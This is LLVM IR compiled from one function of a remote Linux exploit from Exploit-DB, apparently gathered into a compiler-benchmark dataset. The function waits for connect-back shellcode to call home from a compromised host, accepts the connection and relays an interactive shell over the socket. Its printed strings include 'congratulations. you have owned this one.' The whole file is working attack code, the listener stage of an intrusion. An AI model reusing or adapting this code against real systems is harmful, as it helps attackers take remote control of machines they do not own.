; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_181.c_wait_for_connect.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_181.c_wait_for_connect.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32 }
%struct.sockaddr = type { i32 }

@.str = private unnamed_addr constant [52 x i8] c".  waiting for connect_back shellcode responde...  \00", align 1
@.str.1 = private unnamed_addr constant [12 x i8] c"\08failed!\0D*\0A\00", align 1
@.str.2 = private unnamed_addr constant [37 x i8] c"\08connected\0A.       ^---> from %s:%d\0A\00", align 1
@.str.3 = private unnamed_addr constant [46 x i8] c".  congratulations. you have owned this one.\0A\00", align 1
@.str.4 = private unnamed_addr constant [61 x i8] c".  bye-bye. Stay tuned for more Tamandua Sekure Labs codes.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @wait_for_connect(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [256 x i32], align 16
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([52 x i8], [52 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* %3, align 4
  %13 = call i32 @async_read(i32 %12, i32 15)
  %14 = load i32, i32* %3, align 4
  %15 = icmp ne i32 %13, %14
  br i1 %15, label %16, label %19

16:                                               ; preds = %1
  %17 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.1, i64 0, i64 0))
  %18 = call i32 @exit(i32 0) #3
  unreachable

19:                                               ; preds = %1
  %20 = load i32, i32* %3, align 4
  %21 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %22 = call i32 @accept(i32 %20, %struct.sockaddr* %21, i32* %7)
  store i32 %22, i32* %6, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %24 = load i32, i32* %23, align 4
  %25 = call i8* @inet_ntoa(i32 %24)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %27 = load i32, i32* %26, align 4
  %28 = call i32 @ntohs(i32 %27)
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.2, i64 0, i64 0), i8* %25, i32 %28)
  %30 = load i32, i32* %3, align 4
  %31 = call i32 @close(i32 %30)
  %32 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.3, i64 0, i64 0))
  br label %33

33:                                               ; preds = %19, %80
  %34 = call i32 @FD_ZERO(i32* %4)
  %35 = call i32 @FD_SET(i32 0, i32* %4)
  %36 = load i32, i32* %6, align 4
  %37 = call i32 @FD_SET(i32 %36, i32* %4)
  %38 = load i32, i32* %6, align 4
  %39 = add nsw i32 %38, 1
  %40 = call i64 @select(i32 %39, i32* %4, i32* null, i32* null, i32* null)
  %41 = icmp sgt i64 %40, 0
  br i1 %41, label %42, label %80

42:                                               ; preds = %33
  %43 = call i64 @FD_ISSET(i32 0, i32* %4)
  %44 = icmp ne i64 %43, 0
  br i1 %44, label %45, label %60

45:                                               ; preds = %42
  %46 = getelementptr inbounds [256 x i32], [256 x i32]* %5, i64 0, i64 0
  %47 = call i32 @read(i32 0, i32* %46, i32 256)
  store i32 %47, i32* %9, align 4
  %48 = load i32, i32* %9, align 4
  %49 = icmp slt i32 %48, 0
  br i1 %49, label %50, label %51

50:                                               ; preds = %45
  br label %81

51:                                               ; preds = %45
  %52 = load i32, i32* %6, align 4
  %53 = getelementptr inbounds [256 x i32], [256 x i32]* %5, i64 0, i64 0
  %54 = load i32, i32* %9, align 4
  %55 = call i32 @write(i32 %52, i32* %53, i32 %54)
  %56 = load i32, i32* %9, align 4
  %57 = icmp ne i32 %55, %56
  br i1 %57, label %58, label %59

58:                                               ; preds = %51
  br label %81

59:                                               ; preds = %51
  br label %60

60:                                               ; preds = %59, %42
  %61 = load i32, i32* %6, align 4
  %62 = call i64 @FD_ISSET(i32 %61, i32* %4)
  %63 = icmp ne i64 %62, 0
  br i1 %63, label %64, label %79

64:                                               ; preds = %60
  %65 = load i32, i32* %6, align 4
  %66 = getelementptr inbounds [256 x i32], [256 x i32]* %5, i64 0, i64 0
  %67 = call i32 @read(i32 %65, i32* %66, i32 256)
  store i32 %67, i32* %10, align 4
  %68 = load i32, i32* %10, align 4
  %69 = icmp slt i32 %68, 0
  br i1 %69, label %70, label %71

70:                                               ; preds = %64
  br label %81

71:                                               ; preds = %64
  %72 = getelementptr inbounds [256 x i32], [256 x i32]* %5, i64 0, i64 0
  %73 = load i32, i32* %10, align 4
  %74 = call i32 @write(i32 0, i32* %72, i32 %73)
  %75 = load i32, i32* %10, align 4
  %76 = icmp ne i32 %74, %75
  br i1 %76, label %77, label %78

77:                                               ; preds = %71
  br label %81

78:                                               ; preds = %71
  br label %79

79:                                               ; preds = %78, %60
  br label %80

80:                                               ; preds = %79, %33
  br label %33

81:                                               ; preds = %77, %70, %58, %50
  %82 = load i32, i32* %6, align 4
  %83 = call i32 @close(i32 %82)
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.4, i64 0, i64 0))
  %85 = load i32, i32* %2, align 4
  ret i32 %85
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @async_read(i32, i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i8* @inet_ntoa(i32) #1

declare dso_local i32 @ntohs(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i32*, i32) #1

declare dso_local i32 @write(i32, i32*, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
